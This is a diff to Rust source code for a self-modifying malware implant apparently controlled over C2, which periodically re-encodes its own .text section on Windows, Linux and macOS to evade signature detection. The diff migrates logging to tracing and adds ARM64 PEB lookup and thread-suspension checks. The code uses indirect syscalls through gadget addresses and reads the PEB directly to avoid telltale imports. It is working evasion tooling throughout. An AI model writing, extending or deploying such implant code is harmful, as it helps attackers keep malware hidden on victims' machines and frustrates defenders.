@@ -74,7 +74,7 @@ pub fn derive_default_seed(session_key: &[u8; 32]) -> u64 {
     let seed = u64::from_le_bytes(hash[..8].try_into().expect("slice is 8 bytes"));
     // Ensure non-zero
     let seed = if seed == 0 { 1u64 } else { seed };
-    log::info!("self_reencode: auto-derived default seed 0x{seed:016x} from session key + OsRng");
+    tracing::info!("self_reencode: auto-derived default seed 0x{seed:016x} from session key + OsRng");
     seed
 }
 
@@ -84,7 +84,7 @@ pub fn derive_default_seed(session_key: &[u8; 32]) -> u64 {
 /// between a C2-sent seed and the auto-derived default.
 pub fn set_seed(seed: u64) {
     CURRENT_SEED.store(seed, Ordering::SeqCst);
-    log::info!("self_reencode: seed updated to 0x{seed:016x} (source: c2-supplied)");
+    tracing::info!("self_reencode: seed updated to 0x{seed:016x} (source: c2-supplied)");
 }
 
 /// Get the current seed.
@@ -96,7 +96,7 @@ pub fn current_seed() -> u64 {
 pub fn set_interval_secs(secs: u64) {
     if secs > 0 {
         REENCODE_INTERVAL_SECS.store(secs, Ordering::SeqCst);
-        log::info!("self_reencode: interval updated to {secs}s");
+        tracing::info!("self_reencode: interval updated to {secs}s");
     }
 }
 
@@ -170,16 +170,28 @@ pub fn find_text_section() -> Result<TextSection> {
 
 #[cfg(windows)]
 fn find_text_section_windows() -> Result<TextSection> {
-    use winapi::um::winnt::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64};
+    use windows_sys::Win32::System::Diagnostics::Debug::{IMAGE_NT_HEADERS64};
+    use windows_sys::Win32::System::SystemServices::{IMAGE_DOS_HEADER};
 
     // Resolve the agent's own module base.  The agent can be either the main
     // EXE or a DLL loaded into another process.  Read PEB.ImageBaseAddress
     // directly to avoid a GetModuleHandleW(NULL) IAT entry.
     let base = unsafe {
-        // PEB is at GS:[0x60] on x86_64 Windows.
         // PEB.ImageBaseAddress is at offset 0x10 (PVOID).
         let peb: *mut u8;
-        std::arch::asm!("mov {}, gs:[0x60]", out(reg) peb);
+        #[cfg(target_arch = "x86_64")]
+        {
+            // PEB is at GS:[0x60] on x86_64 Windows.
+            std::arch::asm!("mov {}, gs:[0x60]", out(reg) peb);
+        }
+        #[cfg(target_arch = "aarch64")]
+        {
+            // On ARM64 Windows, TPIDR_EL0 holds the TEB pointer.
+            // PEB pointer is at TEB+0x60 (same offset as gs:[0x60] on x86-64).
+            let teb: *mut u8;
+            std::arch::asm!("mrs {}, tpidr_el0", out(reg) teb);
+            peb = *(teb.add(0x60) as *const *mut u8);
+        }
         let base_ptr = (peb as *const usize).add(0x10 / std::mem::size_of::<usize>());
         base_ptr.read() as usize
     };
@@ -201,11 +213,11 @@ fn find_text_section_windows() -> Result<TextSection> {
 
         let section_table_offset = dos.e_lfanew as usize
             + std::mem::size_of::<u32>() // Signature
-            + std::mem::size_of::<winapi::um::winnt::IMAGE_FILE_HEADER>()
+            + std::mem::size_of::<windows_sys::Win32::System::Diagnostics::Debug::IMAGE_FILE_HEADER>()
             + nt.FileHeader.SizeOfOptionalHeader as usize;
 
         let sections = std::slice::from_raw_parts(
-            (base + section_table_offset) as *const winapi::um::winnt::IMAGE_SECTION_HEADER,
+            (base + section_table_offset) as *const windows_sys::Win32::System::Diagnostics::Debug::IMAGE_SECTION_HEADER,
             nt.FileHeader.NumberOfSections as usize,
         );
 
@@ -213,8 +225,8 @@ fn find_text_section_windows() -> Result<TextSection> {
             // .text section name is ".text\0\0\0" (8 bytes, null-padded).
             if &sec.Name[..5] == b".text" {
                 let text_base = base + sec.VirtualAddress as usize;
-                let text_size = *sec.Misc.VirtualSize() as usize;
-                log::debug!(
+                let text_size = sec.Misc.VirtualSize as usize;
+                tracing::debug!(
                     "self_reencode: found .text at {:#x}, size={} bytes",
                     text_base,
                     text_size
@@ -249,7 +261,7 @@ fn find_text_section_linux() -> Result<TextSection> {
                 let load_base = find_load_base()?;
                 let text_base = (load_base + sh.sh_addr as usize) as usize;
                 let text_size = sh.sh_size as usize;
-                log::debug!(
+                tracing::debug!(
                     "self_reencode: found .text at {:#x}, size={} bytes (load_base={:#x}, sh_addr={:#x})",
                     text_base,
                     text_size,
@@ -399,7 +411,7 @@ fn find_text_section_macos() -> Result<TextSection> {
                                 anyhow::bail!("self_reencode: Mach-O __text section is empty");
                             }
 
-                            log::debug!(
+                            tracing::debug!(
                                 "self_reencode: found macOS __text at {:#x}, size={} bytes",
                                 text_base,
                                 text_size
@@ -482,7 +494,7 @@ impl FrozenThreads {
 
         let elapsed = self.frozen_at.elapsed();
         if elapsed > Duration::from_secs(FREEZE_WARN_SECS) {
-            log::warn!(
+            tracing::warn!(
                 "self_reencode: threads were frozen for {:.1}s (>{FREEZE_WARN_SECS}s threshold)",
                 elapsed.as_secs_f64()
             );
@@ -501,7 +513,7 @@ impl FrozenThreads {
                 crate::syscalls::do_syscall(t.ssn, t.gadget_addr, &[handle as u64])
             });
         }
-        log::debug!("self_reencode: all sibling threads resumed");
+        tracing::debug!("self_reencode: all sibling threads resumed");
     }
 }
 
@@ -509,7 +521,7 @@ impl FrozenThreads {
 impl Drop for FrozenThreads {
     fn drop(&mut self) {
         if !self.thawed {
-            log::warn!(
+            tracing::warn!(
                 "self_reencode: FrozenThreads dropped without explicit thaw — auto-resuming"
             );
             self.thaw();
@@ -566,7 +578,7 @@ fn current_pid() -> usize {
 /// kernel32 IAT entries are added.
 #[cfg(windows)]
 pub(crate) fn freeze_threads() -> Result<FrozenThreads> {
-    use winapi::shared::ntdef::OBJECT_ATTRIBUTES;
+    use crate::win_types::OBJECT_ATTRIBUTES;
 
     // ── NT structures for NtQuerySystemInformation(SystemProcessInformation) ──
     //
@@ -729,7 +741,7 @@ pub(crate) fn freeze_threads() -> Result<FrozenThreads> {
                                 handles.push((handle, prev_suspend));
                             }
                             Ok(s) => {
-                                log::warn!(
+                                tracing::warn!(
                                     "self_reencode: NtSuspendThread(tid={:#x}) returned {:#010x}, closing handle",
                                     tid, s
                                 );
@@ -743,7 +755,7 @@ pub(crate) fn freeze_threads() -> Result<FrozenThreads> {
                                     });
                             }
                             Err(e) => {
-                                log::warn!(
+                                tracing::warn!(
                                     "self_reencode: NtSuspendThread resolve failed for tid={:#x}: {e}, closing handle",
                                     tid
                                 );
@@ -760,14 +772,14 @@ pub(crate) fn freeze_threads() -> Result<FrozenThreads> {
                     }
                     Ok(s) => {
                         // Access denied or similar — skip silently.
-                        log::debug!(
+                        tracing::debug!(
                             "self_reencode: NtOpenThread(tid={:#x}) returned {:#010x}, skipping",
                             tid,
                             s
                         );
                     }
                     Err(e) => {
-                        log::debug!(
+                        tracing::debug!(
                             "self_reencode: NtOpenThread resolve failed for tid={:#x}: {e}",
                             tid
                         );
@@ -775,8 +787,84 @@ pub(crate) fn freeze_threads() -> Result<FrozenThreads> {
                 }
             }
 
-            log::info!(
-                "self_reencode: froze {} sibling threads (my_tid={:#x})",
+            // ── Verify thread suspension ─────────────────────────────────
+            //
+            // CRIT-002: NtSuspendThread can return success (STATUS_SUCCESS) even
+            // if the thread is not yet actually suspended (e.g. the thread was in
+            // a kernel wait that hasn't completed).  We verify by calling
+            // WaitForSingleObject with a 0 ms timeout on each handle.  A suspended
+            // thread will NOT be signaled, so WaitForSingleObject returns
+            // WAIT_TIMEOUT (0x102).  If the thread terminated despite our
+            // suspension attempt, WaitForSingleObject returns WAIT_OBJECT_0 (0).
+            //
+            // If any thread fails verification, we abort the re-encoding pass to
+            // avoid rewriting .text under a still-running sibling.
+
+            let wait_result = crate::syscalls::get_syscall_id("NtWaitForSingleObject");
+            if let Ok(wait_sys) = wait_result {
+                // LARGE_INTEGER timeout = -100000 (100ns units) → 10 ms.
+                // Negative means relative timeout.
+                let timeout_100ns: i64 = -100_000i64; // 10 ms in 100ns units
+                let mut unverified_count = 0u32;
+
+                for &(handle, _) in &handles {
+                    let mut wait_status: i32 = 0;
+                    let status = unsafe {
+                        crate::syscalls::do_syscall(
+                            wait_sys.ssn,
+                            wait_sys.gadget_addr,
+                            &[
+                                handle as u64,            // Handle
+                                0u64,                     // Alertable = FALSE
+                                &timeout_100ns as *const i64 as u64, // Timeout (large integer)
+                            ],
+                        )
+                    };
+
+                    // NtWaitForSingleObject returns:
+                    //   STATUS_WAIT_0 (0)       → thread is signaled (terminated!)
+                    //   STATUS_TIMEOUT (0x102)   → thread is NOT signaled (still suspended) ✓
+                    //   Other                    → unexpected, treat as failure
+                    if status != 0x00000102i32 {
+                        unverified_count += 1;
+                        tracing::error!(
+                            "self_reencode: thread handle {:#x} verification FAILED — NtWaitForSingleObject returned {:#010x} (expected STATUS_TIMEOUT=0x102)",
+                            handle,
+                            status
+                        );
+                    }
+                }
+
+                if unverified_count > 0 {
+                    tracing::error!(
+                        "self_reencode: {unverified_count} thread(s) failed suspension verification — aborting re-encoding pass"
+                    );
+                    // Resume all threads we suspended and return an error.
+                    for (handle, _) in handles {
+                        let mut dummy: u32 = 0;
+                        let _ = crate::syscalls::get_syscall_id("NtResumeThread").map(|t| unsafe {
+                            crate::syscalls::do_syscall(
+                                t.ssn,
+                                t.gadget_addr,
+                                &[handle as u64, &mut dummy as *mut u32 as u64],
+                            )
+                        });
+                        let _ = crate::syscalls::get_syscall_id("NtClose").map(|t| unsafe {
+                            crate::syscalls::do_syscall(t.ssn, t.gadget_addr, &[handle as u64])
+                        });
+                    }
+                    anyhow::bail!(
+                        "self_reencode: {unverified_count} thread(s) failed suspension verification — aborting to prevent .text corruption"
+                    );
+                }
+            } else {
+                tracing::warn!(
+                    "self_reencode: could not resolve NtWaitForSingleObject for suspension verification — proceeding without verification (risk: .text may be rewritten under running threads)"
+                );
+            }
+
+            tracing::info!(
+                "self_reencode: froze and verified {} sibling threads (my_tid={:#x})",
                 handles.len(),
                 my_tid
             );
@@ -830,7 +918,7 @@ impl FrozenThreads {
 
         let elapsed = self.frozen_at.elapsed();
         if elapsed > Duration::from_secs(FREEZE_WARN_SECS) {
-            log::warn!(
+            tracing::warn!(
                 "self_reencode: threads were frozen for {:.1}s (>{FREEZE_WARN_SECS}s threshold)",
                 elapsed.as_secs_f64()
             );
@@ -847,7 +935,7 @@ impl FrozenThreads {
                 )
             };
         }
-        log::debug!("self_reencode: all sibling threads resumed (SIGCONT)");
+        tracing::debug!("self_reencode: all sibling threads resumed (SIGCONT)");
     }
 }
 
@@ -855,7 +943,7 @@ impl FrozenThreads {
 impl Drop for FrozenThreads {
     fn drop(&mut self) {
         if !self.thawed {
-            log::warn!(
+            tracing::warn!(
                 "self_reencode: FrozenThreads dropped without explicit thaw — auto-resuming"
             );
             self.thaw();
@@ -888,7 +976,7 @@ pub(crate) fn freeze_threads() -> Result<FrozenThreads> {
             if ret == 0 {
                 tids.push(tid);
             } else {
-                log::debug!(
+                tracing::debug!(
                     "self_reencode: tgkill(SIGSTOP, tid={}) failed: {}",
                     tid,
                     std::io::Error::last_os_error()
@@ -897,11 +985,104 @@ pub(crate) fn freeze_threads() -> Result<FrozenThreads> {
         }
     }
 
-    log::info!(
+    tracing::info!(
         "self_reencode: froze {} sibling threads (my_tid={})",
         tids.len(),
         my_tid
     );
+
+    // ── Verify thread suspension (CRIT-002) ──────────────────────────────
+    //
+    // After sending SIGSTOP to each sibling, verify each thread is actually
+    // in the stopped state by reading /proc/self/task/{tid}/status.  The
+    // `State:` line should read `T (stopped)` for a SIGSTOP'd thread.
+    //
+    // Because SIGSTOP delivery is asynchronous (the kernel must schedule the
+    // target thread to dequeue the signal), we retry with backoff instead of
+    // a single immediate check.  This avoids aborting valid re-encoding passes
+    // on busy systems where signal delivery is slightly delayed.
+    //
+    // If any thread is not stopped after all retries, we abort the re-encoding
+    // pass to avoid rewriting .text under a still-running sibling.
+    {
+        /// Helper: check whether a thread is in state 'T' (stopped).
+        fn thread_is_stopped(tid: i32) -> std::io::Result<bool> {
+            let status_path = format!("/proc/self/task/{tid}/status");
+            let content = std::fs::read_to_string(&status_path)?;
+            Ok(content.lines().any(|line| {
+                if let Some(rest) = line.strip_prefix("State:") {
+                    rest.trim_start().starts_with('T')
+                } else {
+                    false
+                }
+            }))
+        }
+
+        const VERIFY_RETRIES: u32 = 10;
+        // Exponential backoff: 100 µs → 200 µs → 400 µs → … → ~51 ms total.
+        const INITIAL_BACKOFF_US: u64 = 100;
+
+        let mut unverified_tids: Vec<i32> = Vec::new();
+        let mut backoff_us = INITIAL_BACKOFF_US;
+
+        for attempt in 0..=VERIFY_RETRIES {
+            unverified_tids.clear();
+            for &tid in &tids {
+                match thread_is_stopped(tid) {
+                    Ok(true) => {} // confirmed stopped
+                    Ok(false) => {
+                        unverified_tids.push(tid);
+                    }
+                    Err(e) => {
+                        tracing::debug!(
+                            "self_reencode: cannot read status for tid={tid}: {e}"
+                        );
+                        unverified_tids.push(tid);
+                    }
+                }
+            }
+
+            if unverified_tids.is_empty() {
+                break; // all threads confirmed stopped
+            }
+
+            if attempt < VERIFY_RETRIES {
+                // Yield to give the kernel time to deliver pending SIGSTOPs.
+                let ts = libc::timespec {
+                    tv_sec: 0,
+                    tv_nsec: (backoff_us * 1000) as i64,
+                };
+                unsafe { libc::nanosleep(&ts, std::ptr::null_mut()) };
+                backoff_us *= 2;
+            }
+        }
+
+        if !unverified_tids.is_empty() {
+            tracing::error!(
+                "self_reencode: {} thread(s) failed suspension verification after {} retries: tids={:?} — aborting re-encoding pass",
+                unverified_tids.len(),
+                VERIFY_RETRIES,
+                unverified_tids
+            );
+            // Resume all threads we stopped and return an error.
+            while let Some(tid) = tids.pop() {
+                let _ = unsafe {
+                    libc::syscall(
+                        libc::SYS_tgkill,
+                        pid,
+                        tid,
+                        libc::SIGCONT as libc::c_long,
+                    )
+                };
+            }
+            anyhow::bail!(
+                "self_reencode: {} thread(s) failed suspension verification — aborting to prevent .text corruption",
+                unverified_tids.len()
+            );
+        }
+
+        tracing::debug!("self_reencode: all {} sibling threads confirmed stopped", tids.len());
+    }
 
     Ok(FrozenThreads {
         tids,
@@ -921,6 +1102,25 @@ type KernReturn = i32;
 const KERN_SUCCESS: KernReturn = 0;
 
 #[cfg(target_os = "macos")]
+const TH_STATE_STOPPED: i32 = 1;
+
+#[cfg(target_os = "macos")]
+const THREAD_BASIC_INFO: i32 = 3;
+
+#[cfg(target_os = "macos")]
+#[repr(C)]
+struct ThreadBasicInfo {
+    user_time:     u64, // time_value_t (2 × i32)
+    system_time:   u64, // time_value_t (2 × i32)
+    cpu_usage:     i32,
+    policy:        i32,
+    run_state:     i32,
+    flags:         i32,
+    suspend_count: i32,
+    sleep_time:    i32,
+}
+
+#[cfg(target_os = "macos")]
 unsafe extern "C" {
     fn mach_task_self() -> MachPort;
     fn mach_thread_self() -> MachPort;
@@ -933,6 +1133,12 @@ unsafe extern "C" {
     fn thread_resume(target_act: MachPort) -> KernReturn;
     fn mach_port_deallocate(task: MachPort, name: MachPort) -> KernReturn;
     fn vm_deallocate(target_task: MachPort, address: usize, size: usize) -> KernReturn;
+    fn thread_info(
+        target_act: MachPort,
+        flavor: i32,
+        thread_info_out: *mut i32,
+        thread_info_out_cnt: *mut u32,
+    ) -> KernReturn;
 }
 
 #[cfg(target_os = "macos")]
@@ -953,7 +1159,7 @@ impl FrozenThreads {
 
         let elapsed = self.frozen_at.elapsed();
         if elapsed > Duration::from_secs(FREEZE_WARN_SECS) {
-            log::warn!(
+            tracing::warn!(
                 "self_reencode: threads were frozen for {:.1}s (>{FREEZE_WARN_SECS}s threshold)",
                 elapsed.as_secs_f64()
             );
@@ -963,7 +1169,7 @@ impl FrozenThreads {
             let _ = unsafe { thread_resume(thread) };
             let _ = unsafe { mach_port_deallocate(self.task, thread) };
         }
-        log::debug!("self_reencode: all sibling threads resumed (macOS)");
+        tracing::debug!("self_reencode: all sibling threads resumed (macOS)");
     }
 }
 
@@ -971,7 +1177,7 @@ impl FrozenThreads {
 impl Drop for FrozenThreads {
     fn drop(&mut self) {
         if !self.thawed {
-            log::warn!(
+            tracing::warn!(
                 "self_reencode: FrozenThreads dropped without explicit thaw — auto-resuming"
             );
             self.thaw();
@@ -1009,7 +1215,7 @@ pub(crate) fn freeze_threads() -> Result<FrozenThreads> {
                 frozen.push(thread);
             } else {
                 let _ = mach_port_deallocate(task, thread);
-                log::debug!(
+                tracing::debug!(
                     "self_reencode: thread_suspend failed for thread {} with kern_return_t {}",
                     thread,
                     suspend_kr
@@ -1023,10 +1229,62 @@ pub(crate) fn freeze_threads() -> Result<FrozenThreads> {
         }
         let _ = mach_port_deallocate(task, self_thread);
 
-        log::info!(
+        tracing::info!(
             "self_reencode: froze {} sibling threads (macOS)",
             frozen.len()
         );
+
+        // ── Verify thread suspension (CRIT-002) ──────────────────────────
+        //
+        // After calling thread_suspend() on each sibling, verify each thread
+        // is actually in the stopped state by calling thread_info() with
+        // THREAD_BASIC_INFO flavor and checking run_state == TH_STATE_STOPPED.
+        //
+        // If any thread is not stopped, we abort the re-encoding pass to
+        // avoid rewriting .text under a still-running sibling.
+        {
+            let mut unverified_count = 0u32;
+            for &thread in &frozen {
+                let mut info: ThreadBasicInfo = unsafe { std::mem::zeroed() };
+                let mut info_count = std::mem::size_of::<ThreadBasicInfo>() as u32 / 4; // counted in i32s
+                let kr = unsafe {
+                    thread_info(
+                        thread,
+                        THREAD_BASIC_INFO,
+                        &mut info as *mut ThreadBasicInfo as *mut i32,
+                        &mut info_count,
+                    )
+                };
+                if kr != KERN_SUCCESS {
+                    unverified_count += 1;
+                    tracing::error!(
+                        "self_reencode: thread_info failed for thread {} (kr={kr}) — verification failed",
+                        thread
+                    );
+                } else if info.run_state != TH_STATE_STOPPED {
+                    unverified_count += 1;
+                    tracing::error!(
+                        "self_reencode: thread {} is NOT stopped (run_state={}) — verification failed",
+                        thread,
+                        info.run_state
+                    );
+                }
+            }
+
+            if unverified_count > 0 {
+                tracing::error!(
+                    "self_reencode: {unverified_count} thread(s) failed suspension verification — aborting re-encoding pass"
+                );
+                // Resume all threads we suspended and return an error.
+                while let Some(thread) = frozen.pop() {
+                    let _ = thread_resume(thread);
+                    let _ = mach_port_deallocate(task, thread);
+                }
+                anyhow::bail!(
+                    "self_reencode: {unverified_count} thread(s) failed suspension verification — aborting to prevent .text corruption"
+                );
+            }
+        }
 
         Ok(FrozenThreads {
             threads: frozen,
@@ -1054,7 +1312,7 @@ pub unsafe fn reencode_text(seed: u64) -> Result<()> {
         anyhow::bail!("self_reencode: .text section is empty");
     }
 
-    log::info!(
+    tracing::info!(
         "self_reencode: beginning re-encoding of .text ({:#x}, {} bytes, seed=0x{:016x})",
         text.base,
         text.size,
@@ -1068,7 +1326,7 @@ pub unsafe fn reencode_text(seed: u64) -> Result<()> {
     let transformed = code_transform::transform(&original, seed);
 
     if transformed.is_empty() {
-        log::error!(
+        tracing::error!(
             "self_reencode: transform returned empty output — skipping re-encode (would NOP-pad entire .text)"
         );
         return Err(anyhow::anyhow!("transform produced empty output"));
@@ -1083,7 +1341,7 @@ pub unsafe fn reencode_text(seed: u64) -> Result<()> {
         let tail = &transformed[text.size..];
         let all_nops = tail.iter().all(|&b| b == 0x90);
         if !all_nops {
-            log::error!(
+            tracing::error!(
                 "self_reencode: transformed .text is {} bytes, original is {} bytes, \
                  and trailing bytes are not all NOPs — skipping re-encoding to avoid corruption",
                 transformed.len(),
@@ -1091,7 +1349,7 @@ pub unsafe fn reencode_text(seed: u64) -> Result<()> {
             );
             return Ok(());
         }
-        log::warn!(
+        tracing::warn!(
             "self_reencode: transformed .text is {} bytes, original is {} bytes — truncating NOP-padding to fit",
             transformed.len(),
             text.size
@@ -1129,7 +1387,7 @@ pub unsafe fn reencode_text(seed: u64) -> Result<()> {
     // 6. Resume sibling threads now that .text is back to RX and flushed.
     frozen.thaw();
 
-    log::info!(
+    tracing::info!(
         "self_reencode: successfully re-encoded {} bytes of .text with seed 0x{:016x}",
         write_len,
         seed
@@ -1406,21 +1664,21 @@ pub fn spawn_periodic_reencode(
             tokio::select! {
                 _ = crate::memory_guard::guarded_sleep(sleep_dur, None, 0) => {},
                 _ = shutdown.notified() => {
-                    log::info!("self_reencode: shutdown signal received, stopping periodic re-encode");
+                    tracing::info!("self_reencode: shutdown signal received, stopping periodic re-encode");
                     return;
                 }
             }
 
             let current = current_seed();
             let fresh_seed = derive_fresh_seed(current);
-            log::info!("self_reencode: periodic re-encode triggered with seed 0x{fresh_seed:016x}");
+            tracing::info!("self_reencode: periodic re-encode triggered with seed 0x{fresh_seed:016x}");
 
             match unsafe { reencode_text(fresh_seed) } {
                 Ok(()) => {
                     set_seed(fresh_seed);
                 }
                 Err(e) => {
-                    log::error!("self_reencode: periodic re-encode failed: {e:#}");
+                    tracing::error!("self_reencode: periodic re-encode failed: {e:#}");
                 }
             }
         }
@@ -1431,7 +1689,7 @@ pub fn spawn_periodic_reencode(
 /// Used for the initial re-encode after C2 check-in.
 pub fn reencode_once(seed: u64) -> Result<()> {
     let fresh_seed = derive_fresh_seed(seed);
-    log::info!("self_reencode: initial re-encode with seed 0x{fresh_seed:016x}");
+    tracing::info!("self_reencode: initial re-encode with seed 0x{fresh_seed:016x}");
     unsafe { reencode_text(fresh_seed) }?;
     set_seed(fresh_seed);
     Ok(())
@@ -1461,10 +1719,10 @@ pub fn hash_text_section() -> Result<String> {
 /// message or as the `TaskResponse` result).
 pub fn morph_now(seed: u64) -> Result<String> {
     let fresh_seed = derive_fresh_seed(seed);
-    log::info!("self_reencode: MorphNow triggered with seed 0x{fresh_seed:016x}");
+    tracing::info!("self_reencode: MorphNow triggered with seed 0x{fresh_seed:016x}");
     unsafe { reencode_text(fresh_seed) }?;
     set_seed(fresh_seed);
     let hash = hash_text_section()?;
-    log::info!("self_reencode: MorphNow completed, .text hash = {hash}");
+    tracing::info!("self_reencode: MorphNow completed, .text hash = {hash}");
     Ok(hash)
 }
